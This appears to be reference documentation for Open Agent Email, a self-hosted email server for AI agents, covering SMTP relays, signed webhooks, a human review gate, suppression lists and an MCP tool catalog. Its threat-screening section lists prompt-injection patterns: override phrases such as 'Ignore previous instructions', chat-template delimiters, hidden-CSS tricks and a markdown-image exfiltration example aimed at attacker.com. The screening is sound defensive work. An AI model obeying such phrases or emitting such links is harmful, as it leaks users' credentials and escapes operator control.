# Reference

Detailed behaviour of Open Agent Email: configuration, webhooks, review gate, human handoff, MCP tool catalog, threat screening, triage and approval links. For a first run, start with [quickstart.md](quickstart.md); for the overview, see the [README](../README.md).

## ⚙️ Configuration & Features

### 1. Upstream SMTP Relay (`/settings`)
Set `SMTP_CONFIG_ENCRYPTION_KEY` before saving SMTP credentials. The server encrypts newly configured credentials at rest and upgrades existing plaintext credentials at startup when the key is available. Encrypted credentials require the key; startup fails if it is missing or incorrect. Back it up with the database. To rotate it, set the new key as `SMTP_CONFIG_ENCRYPTION_KEY` and the old key as `SMTP_CONFIG_ENCRYPTION_KEY_PREVIOUS`, restart so credentials are re-encrypted, then remove the previous key and restart again. The settings API only reports whether a password is configured. Without an encryption key, legacy plaintext credentials remain usable and a startup warning is logged.

Set `PUBLIC_BASE_URL` to the publicly reachable HTTPS origin where this server serves the unsubscribe page, for example `PUBLIC_BASE_URL=https://mail.example.com` (also supported in Docker Compose via `.env`). Only HTTPS on port 443 without credentials, query, or fragment is accepted; unset or invalid values safely omit unsubscribe headers and footer content. Configure a real public hostname that routes to this service; local, reserved, and loopback IP hosts are ignored. External outbound mail receives `List-Unsubscribe` and RFC 8058 one-click headers plus a visible unsubscribe link. No unsubscribe token is generated for local inbox loopback or while a message is waiting for review; a token is created when dispatch starts and its SHA-256 hash is committed before SMTP is attempted. The public page's GET is read-only so link scanners cannot unsubscribe recipients; a person must submit its confirmation form, or a mail client may send the exact RFC one-click POST. Successful opt-out creates the same inbox-scoped suppression used by the operator API, so queued mail is blocked at the final dispatch check. Tokens are opaque, scoped to one inbox and recipient, and only their hashes are stored.

### 2. Inbox Webhooks
Administrators can manage these endpoints and inspect or replay deliveries in the dashboard's **Webhooks** page, or use the REST API directly. Endpoints are scoped to one agent inbox and created with `POST /v1/webhooks` (`agent_email`, `url`, optional `enabled`); each inbox is limited to 50 endpoints. The response includes a generated `signing_secret` exactly once; store it securely. Rotate it with `POST /v1/webhooks/{endpoint_id}/rotate-secret`; the new secret is shown once, and deliveries include signatures from the new and previous secrets for a 24-hour overlap. Update the receiver during that window. A second rotation replaces the older overlap with the immediately previous secret. Webhook secrets use the same Fernet key and rotation settings as SMTP credentials, so configure `SMTP_CONFIG_ENCRYPTION_KEY` before creating endpoints. `GET /v1/webhooks` lists endpoint metadata without secrets and redacts URL query strings; `PATCH /v1/webhooks/{endpoint_id}` changes URL/enabled state and `DELETE` removes the endpoint and its delivery records. A request already in flight may finish after an endpoint is disabled.

Use the optional `events` array on create or `PATCH` to subscribe an endpoint to selected event types. Omitting it defaults to `['*']` (all events), which preserves behavior for existing endpoints; the dashboard supports selecting individual events. Subscription changes apply to newly queued events; they do not change pending or historical deliveries. Synthetic `webhook.test` events always go to the endpoint when requested, regardless of its event subscriptions.

Subscribed endpoints receive `email.received` for accepted inbound mail. Inbound mail held for review emits `email.received` only after approval releases it to the inbox. The immutable receipt payload contains message and inbox identifiers, sender, recipient, status, thread ID, and receive time. Subjects, message bodies, HTML, and attachments are never included. Messages held for human review emit `email.review_requested` when the pending review is created, followed by `email.review_approved` or `email.review_rejected` when it is resolved. For inbound approval, both `email.review_approved` and `email.received` are durably queued in the same transaction as the message/review state change. Their metadata-only payloads contain `id` (the stable delivery/event ID), `message_id`, `agent_email`, `direction`, `review_id`, resulting message `status`, and `created_at`; they exclude message content, attachment data, and scanner details. Approval results in `delivered` for inbound messages and `sending` for outbound messages; rejection results in `rejected`.

Inbound scanner findings emit `email.flagged` when a message has detected threat signals, and `email.blocked` when the scanner blocks it. A flagged message held for review can emit both `email.flagged` and `email.review_requested`; blocked messages with findings emit both `email.flagged` and `email.blocked`. These events are queued with the inbound message transaction and delivered only to enabled endpoints for that inbox. Their metadata-only payload contains `id` (stable event/delivery ID), `message_id`, `agent_email`, `direction`, resulting message `status`, message `created_at`, and bounded `threat_category`, `threat_severity`, and `threat_score`. Scanner summaries, matched content, message bodies, and attachment details are never included.

Outbound lifecycle webhooks are also available. `email.accepted_by_relay` means the configured upstream SMTP relay accepted the message; it does not mean the recipient's mailbox received it. `email.failed` is emitted only after the worker exhausts its automatic retries, and `email.delivery_unknown` means the worker lost certainty about relay acceptance (for example, after a worker lease expires during dispatch); automatic retry is stopped to avoid a duplicate send. These events are recorded transactionally with their outbound job/message status transitions and sent only to enabled endpoints for that inbox. Their payload contains only `id` (stable event/deduplication ID), `message_id`, `agent_email`, `recipient`, resulting `status`, and the message `created_at`.

For outbound mail, `email.blocked` means the recipient was on that inbox's suppression list when the worker checked immediately before dispatch; the message and outbox job become terminally `blocked`, and no local delivery or SMTP attempt is made. This is separate from the inbound scanner's `email.blocked` event described above.

Enabled endpoints subscribed to `contact.due` receive signed, metadata-only wake-ups for overdue contact engagements. A one-minute bounded sweep atomically records the due schedule it notified and queues delivery in the same transaction, so overlapping sweeps and retries do not create duplicate events. Updating the due time re-arms a notification; closed, replied, and suppressed contacts are excluded. The payload includes the event ID, inbox, engagement ID, contact ID, stage, and due timestamp. It never includes engagement notes or sends an email automatically.

Administrators can also queue a synthetic `webhook.test` event with `POST /v1/webhooks/{endpoint_id}/test`; it contains no real message ID or email content and is delivered through the same signed worker. Receivers should acknowledge or ignore that event type without treating it as an inbound message. `X-Webhook-Event-Id` is the stable event/deduplication identifier, `X-Webhook-Timestamp` is Unix seconds, and `X-Webhook-Signature` is `sha256=<hex HMAC-SHA256>`. The MAC input is the UTF-8 timestamp, a period, the event ID, a period, and the exact raw JSON request body. Verify the signature using a constant-time comparison and reject stale timestamps; deduplicate by event ID. Retries and manual replay reuse the same event ID and payload but receive a new signature timestamp.

Every delivery also carries the current signing headers. `Webhook-Signature: t=<unix>,v1=<hex>[,v1=<hex>]` signs the UTF-8 timestamp, a period and the exact raw body with HMAC-SHA256, with one `v1` value per active secret (the current one, plus the previous one during a rotation overlap). `Webhook-Event-Type` repeats the event type and `Webhook-Schema-Version` is `1`. Receivers may verify either scheme; the `X-Webhook-*` headers above are unchanged. The SDKs' `constructEvent` (TypeScript) and `construct_event` (Python) prefer `Webhook-Signature` and fall back to the legacy headers. A shared set of golden test vectors lives in `fixtures/webhook_signatures.json`.

#### Event envelope and reference

Every payload keeps its original top-level fields and adds `type`, `schema_version` (`"1"`) and `data`, an object holding the event-specific fields without `id` and `created_at`. Payloads never contain message bodies or attachments. For outbound delivery and failure events, `status` appears only in the legacy top-level fields, not in `data`: use `type` to tell events apart.

| Event | When | `data` fields |
|---|---|---|
| `email.received` | Inbound mail delivered to the inbox (or released from review) | `message_id`, `agent_email`, `direction`, `sender`, `recipient`, `status`, `thread_id` |
| `email.flagged` | Inbound mail matched the screening engine | `message_id`, `agent_email`, `direction`, `status`, `threat_category`, `threat_severity`, `threat_score` |
| `email.blocked` | Inbound mail blocked by screening, or an outbound send blocked by a suppression | as `email.flagged` (inbound) or `message_id`, `agent_email`, `recipient` (outbound) |
| `email.review_requested`, `email.review_approved`, `email.review_rejected` | Review lifecycle | `message_id`, `agent_email`, `direction`, `review_id`, `status` |
| `email.sent` | The message left this system: accepted by the upstream relay, or delivered to a local inbox. Not a delivery confirmation | `message_id`, `agent_email`, `recipient` |
| `email.accepted_by_relay` | The upstream SMTP relay accepted the message | `message_id`, `agent_email`, `recipient` |
| `email.delivered`, `email.delivery_delayed`, `email.bounced`, `email.complained` | Provider feedback (SES over SNS) | `message_id`, `agent_email`, `recipient` |
| `email.failed`, `email.delivery_unknown` | Retries exhausted, or relay acceptance became uncertain | `message_id`, `agent_email`, `recipient` |
| `domain.suppression_added` | A permanent bounce or complaint added a recipient to the inbox suppression list | `address`, `source` (`bounce`, `complaint`), `reason`, `message_id` |
| `agent.suppression_added` | A recipient was suppressed: by an operator, an unsubscribe, a permanent bounce or a complaint | `agent_email`, `recipient`, `source` (`operator`, `unsubscribe`, `bounce`, `complaint`), `reason` |
| `domain.sending_verified` | `POST /v1/domains/{domain}/verify` moved the domain to `verified` | `agent_email`, `domain`, `status`, `records` (per-record status) |
| `domain.sending_failed` | A verified domain stopped verifying, or a record newly mismatched | `agent_email`, `domain`, `status`, `records` |
| `contact.due` | A follow-up became due | `agent_email`, `engagement_id`, `contact_id`, `stage`, `next_due_at` |
| `webhook.test` | You requested a test event | `event_type`, `test`, `message` |

Domains belong to the account while webhook endpoints belong to an inbox, so `domain.*` events are delivered to each enabled, subscribed endpoint whose inbox address is on that domain. They are sent only when a verify call changes the state, not on every call.

Endpoint URLs must use HTTPS on port 443 and cannot contain credentials or fragments. At each delivery the worker resolves DNS, rejects the entire answer set if any address is private, loopback, link-local, reserved, or otherwise non-global, then opens TLS directly to a validated IP while checking the certificate against the configured hostname. Redirects are not followed. Connect and total request timeouts are bounded, only response headers (up to 16 KiB) are read, and stored errors omit URL details, response bodies, and secrets. A failed delivery is attempted up to eight times in total, waiting 1 minute, 5 minutes, 15 minutes, 1 hour, 4 hours, 8 hours and 16 hours between attempts (about 29 hours end to end). Inspect bounded history with `GET /v1/webhooks/deliveries?limit=100` (maximum 200), or use cursor pagination with `GET /v1/webhooks/deliveries/page?limit=50`; the page cursor stays bound to endpoint, status, event type, and inbox filters. Failed or previously delivered events can be manually replayed with `POST /v1/webhooks/deliveries/{event_id}/replay`. After 30 days by default, delivery payloads and retry details are erased while a compact ID tombstone remains; fetching or replaying an expired event returns HTTP 410. Configure `WEBHOOK_DELIVERY_RETENTION_DAYS` to change the retention period. Delivery is at-least-once: a timeout after the receiver processes a request can result in a retry, so receivers must deduplicate event IDs. These controls reduce SSRF exposure but do not replace outbound network egress policy at the deployment layer.

To let your agents send real emails to external people over the internet:
1. Connect the dashboard with `ADMIN_API_KEY`.
2. Choose a provider preset in **Upstream SMTP**. It fills in the host, port, and TLS mode; enter your provider-issued SMTP username and password/API token. For Amazon SES, use the SMTP endpoint for your AWS region.

3. Save the relay, send a test email, and enable outbound delivery.

These are SMTP relay presets, not provider-specific API integrations. Gmail requires an App Password; use SMTP credentials generated by SES, Resend, SendGrid, or Postmark.

Optional SES delivery feedback is available through AWS SNS. Set `SES_FEEDBACK_TOPIC_ARN` to the exact SNS topic ARN and configure SES to publish delivery, delivery delay, bounce, complaint, and reject events to that topic, with original message headers included. Subscribe the public `POST /webhooks/ses` endpoint to the topic; signed SNS subscription confirmation is handled automatically. The endpoint rejects requests unless the SNS topic ARN, signature, certificate host/region, and timestamp are valid. Set `SES_CONFIGURATION_SET` to the name of the configuration set whose event destination publishes to that topic; outbound mail is then sent with `X-SES-CONFIGURATION-SET` so SES uses it. SES must echo the `X-Open-Agent-Email-Message-ID` header (added to outbound messages) for feedback to resolve to the exact originating inbox and message. Correlated outcomes appear on the message as `provider_delivery_status` (`delivered`, `delayed`, `bounced`, `complained`, or `rejected`) and can emit `email.delivered`, `email.delivery_delayed`, `email.bounced`, `email.complained`, or `email.failed` webhooks. A permanent bounce or complaint for that message's recipient creates an inbox-scoped suppression; transient bounces, rejects, and delivery events do not. Late delivery or delay notifications do not overwrite a previously recorded bounce, complaint, or rejection. SNS message IDs are persisted for retry deduplication. This opt-in integration currently supports SES feedback over SNS only; without the topic setting, the route is disabled and normal SMTP sending is unchanged.

Outbound message statuses distinguish local delivery from relay acceptance: `delivered` means the message reached another local agent inbox, `accepted_by_relay` means an external SMTP relay accepted it for processing, `sending` means it is queued or being dispatched, `delivery_unknown` means a worker lease expired during dispatch and SMTP acceptance cannot be determined, `blocked` means an inbox suppression prevented dispatch, and `failed` means dispatch exhausted its retries. Non-review sends and approved messages are recorded in a database-backed outbox before dispatch. The worker retries ordinary failures up to eight attempts with exponential backoff and exposes the latest error on the message. A stale processing job is marked `uncertain` and is never automatically resent because the SMTP relay may have accepted it before the worker stopped recording progress. Relay acceptance is not proof that a person received the email; later delivery feedback is available only when the SES/SNS integration above is configured.

Each inbox can maintain an explicit recipient suppression list. Read it with `GET /v1/agents/{email}/suppressions`; add an address with `POST` and `{ "email": "person@example.com", "reason": "optional note" }`; remove an entry with `DELETE /v1/agents/{email}/suppressions/{suppression_id}`. Reads require inbox read access, and add/remove require full-access scope. Addresses are trimmed and lowercased for matching. A send to a suppressed address is rejected with HTTP 422 before a message is created. The worker checks again immediately before local or SMTP dispatch, so queued, retried, and review-approved messages that become suppressed are terminally marked `blocked` without contacting SMTP. Suppressions are scoped to one inbox; they are operator-managed controls, not an unsubscribe link or proof of consent, and contacts do not affect suppression state.

Administrators can inspect bounded outbox history and manually retry failed or uncertain jobs. Retrying an uncertain job requires `confirm_duplicate_risk=true` because the SMTP relay may already have accepted the original attempt. Each manual retry records the actor, timestamp, previous status, previous attempt count, and previous error; retrieve it from `GET /v1/outbox/{job_id}/retries`. Expired worker leases are moved to `uncertain` for operator review rather than automatically reclaimed. Suppression-blocked jobs are terminal and cannot be retried from the outbox.

REST send, reply, forward, contact creation/import, domain deletion, review approval, API-key creation, webhook creation, and webhook-secret rotation accept an optional `Idempotency-Key` header (1–128 characters); MCP send, reply, and forward tools accept an optional `idempotency_key` argument. Repeating a request with the same key and content replays the original result; using that key with different content returns HTTP 422, while a matching request still in progress returns HTTP 409. Keys are scoped to the authenticated principal and stored with a request digest.

REST send and reply requests can render a saved inbox template per message by supplying `template_id` and optional JSON `template_data` instead of direct `subject`/`body_text`/`body_html` content. For example, `POST /v1/agents/{email}/messages` accepts `{ "recipient": "person@example.com", "template_id": "tpl_…", "template_data": { "name": "Sam" } }`; `POST /v1/agents/{email}/messages/{message_id}/reply` accepts the same template fields. The template must belong to that inbox. Rendering uses the same bounded data, variable syntax, output limits, missing-value behavior, HTML escaping, and subject line-break checks as template preview. A reply uses the template subject with a `Re:` prefix when needed while keeping the original thread headers. Template selection creates only that requested message; it does not start a campaign or contact list. The API rejects requests that mix a template with direct content. The Python SDK `send_message` and `reply_message` methods accept the same `template_id` and `template_data` options.

Agents can retrieve a recent verification code with `GET /v1/agents/{email}/messages/otp?since_seconds=600&wait_seconds=5` or the `get_recent_otp` MCP tool. The endpoint searches up to 50 of the inbox's newest delivered inbound messages, and can poll for at most 10 seconds. It only extracts 4–8 digit codes near verification-related language, and returns the code plus minimal message metadata; it never returns the message body. A no-match response is `{ "found": false }`. Inbox-scoped API keys can only query their own inbox.

REST and MCP send/reply calls accept attachments as `{filename, content_type, content_base64}` items. The defaults allow up to 10 files, 10 MiB per file, and 25 MiB total decoded content; the composed message ceiling is 10 MiB across subject, text, HTML, and decoded attachments. Configure `OUTBOUND_MAX_ATTACHMENTS`, `OUTBOUND_MAX_ATTACHMENT_BYTES`, `OUTBOUND_MAX_TOTAL_ATTACHMENT_BYTES`, and `OUTBOUND_MAX_COMPOSED_BYTES`. Attachment metadata includes a five-minute signed `download_url`; links use `ATTACHMENT_URL_SIGNING_KEY` when set, otherwise the encryption key or admin key. JSON base64 adds overhead and is subject to the 40 MiB default HTTP request-body limit.

Optional ClamAV attachment scanning is disabled by default. To enable the bundled private scanner with Docker Compose, set `ATTACHMENT_SCAN_ENABLED=true` in `.env` and start the stack with `docker compose --profile attachment-scan up --build`; the scanner daemon is exposed only on the Compose network. When enabled, inbound SMTP and all REST/MCP outbound attachment paths scan the decoded bytes before database writes. A malware detection is permanently rejected (SMTP 554; REST/MCP HTTP 422); a file over the configured scan-size limit is rejected as too large (SMTP 552; REST/MCP HTTP 413). Scanner outages and timeouts fail closed but temporarily (SMTP 451; REST/MCP HTTP 503) so clients can retry after recovery. This malware scan is separate from the built-in text and HTML prompt-injection screening. Keep ClamAV signatures current; scanning cannot guarantee detection of new or unknown malware. See [the operations guide](docs/operations.md#optional-attachment-malware-scanning) for settings and operational behavior.

### 2. Custom Domains & DNS (`/domains`)
1. Add your agent domain (e.g., `agents.yourdomain.com`).
2. Add the generated DNS records to your DNS registrar (Cloudflare, Route53, Namecheap):
   - `MX`: `10 mx.yourdomain.com` pointing to your server IP.
   - `TXT (SPF)`: `v=spf1 include:_spf.openagent.dev ~all`
   - `TXT (DKIM)`: `default._domainkey` with RSA public key.
   - `TXT (DMARC)`: `_dmarc` with `p=quarantine` or `p=reject`.
3. DNS verification is not implemented yet, so the dashboard does not mark records verified automatically.

### 3. Human-in-the-Loop Review Gate (`/reviews`)
When an agent has `hitl_enabled: true` or when the Threat Scanner detects suspicious prompt injection payloads:
- Inbound mail is quarantined before reaching the agent.
- Outbound mail is held before dispatching to upstream SMTP.
- Operators review reason, threat score, and diffs in the review queue and click **Approve** or **Reject**.

`GET /v1/reviews` optionally accepts `status=pending`, `status=approved`, or `status=rejected`; other values are rejected. The MCP `list_reviews` tool uses the same status set and defaults to `pending`.

### 4. Human Handoff (`/inbox`)
Open an inbound message to view the full conversation in chronological order, including attachments on each message. Use **Hand off to a person** to forward the original email and an optional note to a teammate. Replies from the teammate to the forwarded email return to the agent inbox and stay in the original thread. The agent's outbound approval policy applies. Outbound status `accepted_by_relay` means the configured SMTP relay accepted the message; it does not confirm delivery to the human recipient. A send is shown as failed when no relay is configured or the relay rejects it.

Inbox messages track `is_read`: new inbound mail starts unread, while outbound mail starts read. Opening an inbound message in the dashboard marks it read; use the inbox **Read status** filter to focus on unread messages. Unsent dashboard replies are saved in this browser per inbox thread and restored when you return; they are not synced to another device. API clients can filter paginated results with `read_status=unread|read|all` and mark inbound mail read with `POST /v1/agents/{email}/messages/{message_id}/read` (requires write scope). Keep `read_status` unchanged when following a page cursor.

The dashboard **Contacts** page and `GET /v1/agents/{email}/contacts` provide an address book scoped to one inbox. The list accepts `limit` from 1 to 500 (default 100). Create contacts with `POST`, update with `PATCH /{contact_id}`, and delete with `DELETE /{contact_id}` under that same path. Contact records contain a normalized email address, name, optional company and notes; email and name are bounded to 255 characters and notes to 4,000. A contact email must be unique within its inbox. Read-only inbox keys can list contacts and consent history; create, update, delete, CSV import, and consent changes require full-access scope. Contact records are inert: saving or importing one never sends email, starts outreach, or records consent.

Record explicit operator-entered consent changes at `POST /v1/agents/{email}/contacts/{contact_id}/consent` with `action` (`granted` or `revoked`), required `source`, and optional `evidence` and `note` (each at most 1,000 characters). Entries are append-only and scoped to the contact and inbox. `GET` on the same path returns the current recorded state (`unknown`, `granted`, or `revoked`) and up to 100 most recent entries. This is an audit record only: it does not verify evidence, establish legal consent, alter send policy, lift suppression, or trigger outreach. Imports do not create consent records.

Import UTF-8 CSV through `POST /v1/agents/{email}/contacts/imports` with `Content-Type: text/csv`. Required header: `email`; optional headers: `name`, `company`, and `notes`. Files are limited to 1 MB and 1,000 data rows. Existing addresses, repeated addresses in the file, invalid rows, and addresses on the inbox suppression list are skipped with a per-row reason. The result includes a `batch_id`; list recent batches with `GET .../contacts/imports`. Reverse a batch with `DELETE .../contacts/imports/{batch_id}?confirm=DELETE`. Reversal deletes untouched contacts created by that batch and retains contacts edited afterward. Batch reversal does not remove suppression entries and does not imply permission to contact any imported address.

Structured JSON imports use `POST /v1/contacts/import` with an explicit `agent_email`, up to 1,000 rows, and optional merge/skip behavior. Rows support bounded metadata, suppression, and engagement stage; every row receives an outcome and the request supports idempotent replay. See [the import contract](docs/contact-import.md).

The dashboard **Follow-ups** page and `/v1/agents/{email}/engagements` track a stage (`new`, `contacted`, `waiting`, or `closed`), optional next due time, and notes for one contact in one inbox. Create with `POST` using `contact_id`, `stage`, `next_due_at` (RFC 3339), and `notes`; update with `PATCH /{engagement_id}`; list with `GET`; remove with `DELETE /{engagement_id}`. Add `?due=true` to list only overdue records that are not closed, replied, or suppressed. Scheduling a suppressed recipient returns HTTP 422, and suppression is checked again when determining due records. A DMARC-authenticated inbound message from the contact sets the server-derived `replied` flag and clears its due time; API clients cannot set or clear that fact. Due times never trigger automatic email, campaigns, or other outreach.

An enabled webhook endpoint subscribed to `contact.due` receives a metadata-only wake-up when an engagement becomes overdue. A bounded background sweep runs once per minute and claims each due schedule atomically before queueing deliveries; retries and overlapping sweeps cannot create another wake-up for that same schedule. Changing the due time re-arms notification. Closed, replied, and suppressed contacts are excluded. The payload contains the event ID, inbox, engagement and contact IDs, stage, and scheduled time; it does not include notes or send any email.

Reusable email templates are available in the dashboard's **Templates** page and through `/v1/agents/{email}/templates`. List with `GET`, create with `POST`, fetch by ID, update with `PATCH`, and delete with `DELETE`. A template has a unique name and optional unique alias within its inbox, a subject, and at least one plain-text or HTML body. Content fields are bounded to 100,000 characters (subject to 512); `{{name}}` and nested `{{person.name}}` placeholders are supported. In HTML, standard double braces escape substituted values; triple braces such as `{{{trusted_fragment}}}` insert raw content and must only be used with trusted or pre-escaped values. Templates can be selected by ID or alias when sending a message or reply. The read-only `POST /v1/agents/{email}/templates/preview` accepts subject/body sources and JSON `data`; `POST /{template_id}/preview` renders a saved template with JSON `data`. Both return rendered subject, text, HTML, and referenced variable names without saving or sending anything. Missing values render as empty strings. Preview and send-time data are limited to 16 KB and bounded in depth and item count. Read-only keys can list, fetch, and preview; create, update, and delete require full-access scope. In inbox compose and reply, choose a saved template for the selected inbox, enter JSON data, and preview the rendered subject and body before sending; clearing the selection returns to direct editing and preserves the editor's text. The first-party Python SDK exposes template CRUD, preview, and per-message template sending. Templates cannot send by themselves, create audiences, or start campaigns.

The dashboard reply and compose editors support saved response snippets. Save the current text with a name, then insert or delete snippets from the editor. Snippets are stored in this browser's local storage per inbox; they are not uploaded, shared across browsers, or available through the API. Inserting replaces the editor's current text. Snippets provide plain-text reuse only; compose recipient and subject, and reply thread headers, continue to come from the normal send flow.

Inbound SMTP evaluates SPF against the connecting peer IP and SMTP envelope sender, verifies up to five DKIM signatures from the original message bytes, and evaluates DMARC against the single RFC 5322 From domain. The message stores bounded authentication evidence with evaluation time, peer/envelope identities, From header, passing DKIM domains, and each result. Each DKIM result includes its selector, alignment, status, and diagnostic detail; DMARC evidence includes the visible domain, effective policy, and the SPF/DKIM mechanisms that aligned. Identical SMTP retries are deduplicated per inbox using a digest of the raw message and envelope sender. DMARC discovery follows the RFC 9989 DNS tree walk, and SPF/DKIM identifiers are checked using the published strict or relaxed alignment mode. DNS lookups are bounded; SPF results include `softfail`, `permerror`, and `temperror`, and DMARC reports `temperror` when DNS makes the result inconclusive. On an exact DMARC failure, an effective `p=reject` (including inherited `sp=reject` for a subdomain) receives SMTP 550 without inbox persistence; an effective `p=quarantine` creates a pending review. `p=none`, temporary errors, missing policy, and unverified results follow the ordinary inbound workflow. Policy enforcement uses the evaluated `p` and inherited `sp` values; it does not claim `np` or `pct` sampling behavior.

Inbound MIME attachments are stored with their message and appear in the inbox with authenticated download links. Human handoff forwards those files along with the original message. The SMTP receiver defaults to a 20 MiB raw-message limit, 10 MiB per attachment, and 10 attachments per message; set `SMTP_MAX_MESSAGE_BYTES`, `SMTP_MAX_ATTACHMENT_BYTES`, and `SMTP_MAX_ATTACHMENTS` to adjust these bounds. EHLO advertises the configured SIZE limit and 8BITMIME; MAIL/RCPT parsing accepts ESMTP path parameters while validating the actual inbox address. Configure `SMTP_TLS_CERT_FILE` and `SMTP_TLS_KEY_FILE` to advertise STARTTLS; set `SMTP_REQUIRE_STARTTLS=true` to refuse mail transfer unless TLS is active. Idle SMTP reads time out after 60 seconds, message input has a 5-minute limit, and at most 100 SMTP sessions run concurrently; configure these with `SMTP_READ_TIMEOUT_SECONDS`, `SMTP_DATA_TIMEOUT_SECONDS`, `SMTP_MAX_CONNECTIONS`, and `SMTP_LINE_LIMIT_BYTES`.

`/health` reports process liveness. `/ready` returns HTTP 200 only when the database, inbound SMTP listener, outbound worker, and webhook worker are available; it also reports pending outbox and webhook counts. Use `/ready` for deployment readiness checks.

Administrators can inspect recent outbox jobs at `GET /v1/outbox` (filter with `status` including `uncertain` or `blocked`, and bound `limit` to 200). For older jobs, use cursor pagination with `GET /v1/outbox/page?limit=50`; the optional `status` filter accepts `pending`, `processing`, `complete`, `failed`, `uncertain`, or `blocked`. Keep the filter unchanged when following `next_cursor`. Retry a failed job with `POST /v1/outbox/{job_id}/retry`; retry an uncertain job with `POST /v1/outbox/{job_id}/retry?confirm_duplicate_risk=true`. Retry history records the administrator identity, time, prior state, attempt count, and error.

REST, MCP, and public unsubscribe requests are limited to 120 per socket peer IP per rolling minute by default. Configure `API_RATE_LIMIT_REQUESTS`, `API_RATE_LIMIT_WINDOW_SECONDS`, and `API_RATE_LIMIT_MAX_CLIENTS` for the single-process in-memory limiter. It uses the direct socket peer address and does not trust `X-Forwarded-For`; deployments behind a proxy should enforce client-aware limits at that proxy as well.

REST inbox listings are capped at 500 messages and review lists at 200; MCP message and review tools accept bounded limits up to 100. For larger inboxes, `GET /v1/agents/{email}/messages/page` provides stable cursor pagination (1–100 items per page), optional direction, read-status, and delivery-status filters, and case-insensitive sender/subject search using `q`. Delivery status accepts `delivered`, `accepted_by_relay`, `sending`, `delivery_unknown`, `pending_review`, `rejected`, `blocked`, or `failed`. Follow the returned `next_cursor` with the same filters until it is `null`; the original list endpoint remains available for compatibility.

The HTTP server binds to `127.0.0.1:8000` by default; Docker Compose sets `HOST=0.0.0.0` inside the container so the published port and dashboard can reach it. The SMTP listener also defaults to loopback locally; Compose sets `SMTP_HOST=0.0.0.0` and publishes port `2525`. Configure `HOST`, `PORT`, `SMTP_HOST`, and `SMTP_PORT` for other deployments. Uvicorn caps concurrent connections/tasks at 200 and closes idle keepalive connections after 5 seconds by default; set `HTTP_MAX_CONCURRENCY` and `HTTP_KEEPALIVE_TIMEOUT_SECONDS` to adjust those bounds. HTTP request bodies are capped at 40 MiB by default to allow base64-encoded attachment sets; configure `HTTP_MAX_REQUEST_BYTES`. Requests over the concurrency cap receive HTTP 503 and oversized bodies receive HTTP 413.

SQLite is the default for a single-process self-hosted setup. PostgreSQL can be selected with an async SQLAlchemy URL such as `postgresql+asyncpg://user:password@db-host:5432/open_agent_email`; `asyncpg` is included in the server requirements. Schema changes use Alembic migrations in `server/migrations` and are applied on startup.

---


## MCP tool catalog

| Tool | Description |
| :--- | :--- |
| `list_agents` | Lists all configured agent inboxes and their operational status. |
| `list_messages` | Fetches inbound and outbound messages with status and threat scores. |
| `get_message` | Retrieves full RFC headers, body text, HTML, and security verification verdicts. |
| `get_recent_otp` | Finds a recent contextual verification code from delivered inbound mail in the specified inbox. |
| `send_message` | Dispatches outbound email from the agent address (relays via upstream SMTP). |
| `send_email` | Compatibility name for `send_message`. |
| `reply_to_message` | Replies in-thread preserving `In-Reply-To` and `References`. |
| `forward_message` | Forwards a message with optional replacement body and extra attachments. Outbound approval rules still apply. |
| `forward_to_human` | Forwards the original message and optional context to a human teammate. Outbound approval rules still apply. |
| `list_reviews` | Lists emails held in the Human-in-the-Loop approval queue. |
| `list_pending_messages` | Lists messages currently held in the review queue. |
| `approve_review` | Approves a held email and triggers delivery. |
| `reject_review` | Rejects and quarantines an email. |
| `get_review`, `get_pending_message` | Fetch a review or its pending message details. |
| `approve_pending_message`, `reject_pending_message` | Resolve a pending review using the message ID. |
| `approve_message`, `reject_message` | Compatibility names for review approval and rejection. |

**93 tools in total** (`GET /mcp/tools` returns every schema). Beyond the table above, grouped by the credential each needs:

- **Any credential:** `whoami`.
- **Inbox read scope** (`read_only` or `full_access` key for that inbox, or admin): `list_conversations`, `get_conversation`, `get_message_lifecycle`, `get_agent_metrics`, `get_protection`, `get_attachment` (metadata), `get_attachment_data` (base64, 5 MB cap), `list_templates`, `get_template`, `preview_template`, `list_contacts`, `get_contact`, `get_contact_consent`, `list_outreach_contacts`, `get_outreach_contact`, `list_suppressions`, `list_agent_suppressions`.
- **Inbox write scope** (`full_access` key for that inbox, or admin): `update_message_labels`, `delete_message`, `restore_message`, `create_template`, `update_template`, `delete_template`, `create_contact`, `update_contact`, `delete_contact`, `import_contacts` (CSV text), `delete_contact_import`, `record_contact_consent`, `set_outreach_contact`, `delete_outreach_contact`, `create_agent_suppression`, `delete_agent_suppression`, `delete_suppression`. `send_message`, `send_email`, `reply_to_message`, `forward_message` and `forward_to_human` use the same inbox write scope.
- **Administrator only:** `create_agent`, `get_agent`, `update_agent`, `delete_agent`, `update_protection`, `list_webhooks`, `get_webhook`, `create_webhook`, `update_webhook`, `delete_webhook`, `rotate_webhook_secret`, `test_webhook`, `list_webhook_deliveries`, `list_events`, `get_event`, `redeliver_event`, `list_api_keys`, `create_api_key`, `delete_api_key`, `list_domains`, `get_domain`, `register_domain`, `verify_domain`, `delete_domain`, `get_account_metrics`, `list_outbox`, `retry_outbox_job`.
- **Reviewer keys** can call only `list_reviews`, `list_pending_messages`, `get_review`, `get_pending_message`, the review approval/rejection tools (`approve_review`, `reject_review`, `approve_pending_message`, `reject_pending_message`, `approve_message`, `reject_message`) and `whoami`.

Webhook signing secrets and newly created API keys are returned once, in the response that creates or rotates them; reads never include them. Each tool runs the same code as its REST route, so validation, idempotency, suppression checks and approval rules are identical.

---


## 🔒 Threat Screening Engine

The built-in scanner guards agent inboxes against:
- **Direct Instruction Overrides**: `Ignore previous instructions`, `Disregard system prompts`, `System Override`.
- **CSS / Font Smuggling**: `display:none`, `font-size:0px`, `visibility:hidden`, zero-width Unicode tags.
- **ChatML & Prompt Delimiters**: `<|im_start|>`, `[INST]`, `### System:`, `<|endoftext|>`.
- **Exfiltration Attacks**: Markdown image credential leaks (`![img](https://attacker.com/log?token=...)`).
- **Base64 Payload Obfuscation**: Automatic decoding and heuristic recursion.

These checks inspect message text and HTML; they do not inspect attachment bytes. Optional ClamAV scanning is configured separately as described above.

---

## 🧭 Triage, scheduling and conversations

- **Labels** – `PATCH /v1/agents/{email}/messages/{id}` with `{"labels": ["needs-human"]}`; filter with `?label=`.
- **Trash / restore** – `DELETE` moves a message to trash (cancelling an unsubmitted scheduled send); `POST .../restore` brings it back (409 `not_in_trash` if it isn't in trash, and a send canceled by trashing is re-armed if its `send_at` has not passed); `?trashed=true` lists trash. Trashed messages stay readable by direct `GET`.
